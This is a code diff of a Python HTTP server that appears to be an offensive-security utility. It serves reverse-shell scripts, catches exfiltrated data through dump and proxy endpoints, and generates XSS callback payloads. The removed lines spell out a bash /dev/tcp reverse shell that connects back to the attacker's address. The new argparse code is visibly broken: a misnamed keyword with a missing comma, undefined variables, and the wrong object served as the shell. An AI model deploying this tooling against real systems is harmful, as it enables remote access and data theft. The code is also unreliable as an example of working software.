@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 
+import argparse
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import urlparse
 import threading
@@ -245,10 +246,10 @@ class HttpFileServer(HTTPServer):
         protocol = "https" if type(self.socket) == ssl.SSLSocket else "http"
         return f"{protocol}://{addr}{port}"
 
-    def get_full_url(self, uri):
+    def get_full_url(self, uri, ip_addr=None):
         if not uri.startswith("/"):
             uri = "/" + uri
-        return self.get_base_url() + uri
+        return self.get_base_url(ip_addr) + uri
 
     def stop(self):
         self.is_running = False
@@ -262,27 +263,57 @@ if __name__ == "__main__":
         print("Usage: %s [shell,dump,proxy,xss]" % sys.argv[0])
         exit(1)
 
-    httpPort = 80
-    fileServer = HttpFileServer("0.0.0.0", httpPort)
-    ipAddress = util.get_address()
+    parser = argparse.ArgumentParser(description="Spawn a temporary http server")
+    parser.add_argument(
+        "action",
+        choices=["shell", "dump", "proxy", "xss"],
+        help="Choose one of these actions: shell, dump, proxy, xss"
+    )
 
-    if sys.argv[1] == "shell":
-        listenPort = 4444 if len(sys.argv) < 3 else int(sys.argv[2])
-        rev_shell = "bash -i >& /dev/tcp/%s/%d 0>&1" % (ipAddress, listenPort)
-        fileServer.addFile("shell.sh", rev_shell)
-        fileServer.dumpRequest("/")
-        print("Reverse Shell URL: http://%s/shell.sh" % ipAddress)
-    elif sys.argv[1] == "dump":
-        fileServer.dumpRequest("/")
-        print("Exfiltrate data using: http://%s/" % ipAddress)
-    elif sys.argv[1] == "proxy":
-        url = "https://google.com" if len(sys.argv) < 3 else sys.argv[2]
-        fileServer.forwardRequest("/proxy", url)
-        print("Exfiltrate data using: http://%s/proxy" % ipAddress)
-    elif sys.argv[1]  == "xss":
-        type = "img" if len(sys.argv) < 3 else sys.argv[2]
-        xss = xss_handler.generatePayload(type, ipAddress, httpPort)
+    parser.add_argument(
+        "--bind-address",
+        type=str,
+        default="0.0.0.0",
+        destination="bind_addr"
+        help="Address to bind on (default: 0.0.0.0)"
+    )
+
+    # Optionales Argument: port
+    parser.add_argument(
+        "--port",
+        type=int,
+        default=9000,
+        help="Port to bind on (default: 9000)"
+    )
+
+    parser.add_argument(
+        "--payload",
+        type=str,
+        default=None,
+        help="Payload for xss / shell"
+    )
+
+    args = parser.parse_args()
+
+    file_server = HttpFileServer(args.address, args.port)
+    ip_address = util.get_address()
+
+    if args.action == "shell":
+        payload_type = args.payload if args.payload else "bash"
+        shell_payload = rev_shell.generate_payload(args.payload, ip_address, 4444)
+        file_server.addFile("/shell", rev_shell)
+        print("Reverse Shell URL:", file_server.get_full_url("/shell", ip_address))
+    elif args.action == "dump":
+        file_server.dumpRequest("/")
+        print("Exfiltrate data using:", file_server.get_full_url("/", ip_address))
+    elif args.action == "proxy":
+        url = "https://google.com"
+        file_server.forwardRequest("/proxy", url)
+        print("Exfiltrate data using:", file_server.get_full_url("/proxy", ip_address))
+    elif args.action  == "xss":
+        payload_type = args.payload if args.payload else "img"
+        xss = xss_handler.generatePayload(payload_type, ip_addr, args.port)
         print("Exfiltrate data using:")
         print(xss)
 
-    fileServer.serve_forever()
+    file_server.serve_forever()
